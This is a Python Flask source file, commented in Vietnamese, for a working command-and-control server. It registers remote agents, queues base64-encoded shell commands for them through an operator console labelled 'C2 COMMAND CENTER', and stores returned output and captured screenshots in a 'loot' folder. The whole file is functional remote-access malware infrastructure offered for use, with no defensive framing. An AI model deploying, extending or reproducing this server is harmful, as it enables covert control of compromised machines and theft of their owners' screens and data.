from flask import Flask, request
import random
import string
import datetime
import threading
import time
import sys
import base64
import os  

# Tắt log mặc định của Flask
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

# Cấu trúc: {'ID': {'name': '...', 'tasks': ['lenh1', 'lenh2'], 'results': []}}
agents = {}

# Tạo thư mục 'loot' để lưu dữ liệu thu thập được (ảnh, file) nếu chưa tồn tại
if not os.path.exists('loot'):
    os.makedirs('loot')

def generate_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

# --- Hàm hỗ trợ giải mã an toàn ---
def safe_decode(data_str):
    try:
        return base64.b64decode(data_str).decode('utf-8', errors='ignore')
    except Exception:
        return f"[Raw Data] {data_str}"

# --- API ENDPOINTS ---

@app.route('/reg', methods=['POST'])
def register():
    agent_name = request.form.get('name')
    new_id = generate_id()
    agents[new_id] = {
        "name": agent_name,
        "tasks": [],     # Hàng đợi lệnh
        "results": []
    }
    print(f"\n[+] New Agent: {agent_name} -> ID: {new_id}")
    return new_id, 200

@app.route('/tasks/<agent_id>', methods=['GET'])
def get_task(agent_id):
    # Nếu agent tồn tại và có lệnh đang chờ
    if agent_id in agents and agents[agent_id]['tasks']:
        # Lấy lệnh đầu tiên ra (First In First Out)
        task = agents[agent_id]['tasks'].pop(0)
        return task, 200
    return '', 204 

@app.route('/results/<agent_id>', methods=['POST'])
def receive_result(agent_id):
    if agent_id in agents:
        encoded_output = request.form.get('result')
        if encoded_output:
            # Giải mã kết quả từ Agent
            decoded = safe_decode(encoded_output)
            
            # Kiểm tra xem dữ liệu trả về có phải là ảnh chụp màn hình không
            # Quy ước: Agent gửi chuỗi bắt đầu bằng "[IMAGE] "
            if decoded.startswith("[IMAGE] "):
                try:
                    # Tách phần header và phần dữ liệu ảnh base64
                    _, img_b64 = decoded.split(" ", 1)
                    
                    # Tạo tên file dựa trên tên agent và thời gian
                    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"loot/shot_{agents[agent_id]['name']}_{timestamp}.png"
                    
                    # Giải mã base64 sang binary và ghi ra file
                    with open(filename, "wb") as f:
                        f.write(base64.b64decode(img_b64))
                        
                    print(f"\n[+] Screenshot captured from {agents[agent_id]['name']}")
                    print(f"    Saved to: {filename}")
                except Exception as e:
                    print(f"\n[!] Error saving screenshot: {e}")
            else:
                # Nếu là văn bản bình thường thì in ra console
                print(f"\n[v] Result from {agents[agent_id]['name']} ({agent_id}):\n{decoded}")
            
            print("C2 > ", end="", flush=True)
    return '', 200

# --- CLI ---

def console_thread():
    time.sleep(2) 
    print("\n=== C2 COMMAND CENTER ===")
    print("Syntax: set <agent_id> <command>")
    print("Special: set <agent_id> screenshot") # Hướng dẫn lệnh mới
    
    while True:
        try:
            cmd = input("\nC2 > ")
            if not cmd: continue
            
            parts = cmd.split(' ', 2)
            if parts[0] == "set" and len(parts) == 3:
                target_id = parts[1]
                plain_task = parts[2] # Lệnh dạng clear text
                
                if target_id in agents:
                    # Mã hóa lệnh trước khi đẩy vào hàng đợi
                    encoded_task = base64.b64encode(plain_task.encode()).decode()
                    
                    agents[target_id]['tasks'].append(encoded_task)
                    print(f"[*] Queued encoded task for Agent {target_id}")
                else:
                    print(f"[-] Agent ID {target_id} not found!")
            elif cmd == "list":
                print(f"Agents: {list(agents.keys())}")
            else:
                print("Unknown command. Use: set <id> <cmd> | list")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == '__main__':
    t = threading.Thread(target=console_thread, daemon=True)
    t.start()
    
    app.run(host='0.0.0.0', port=8080)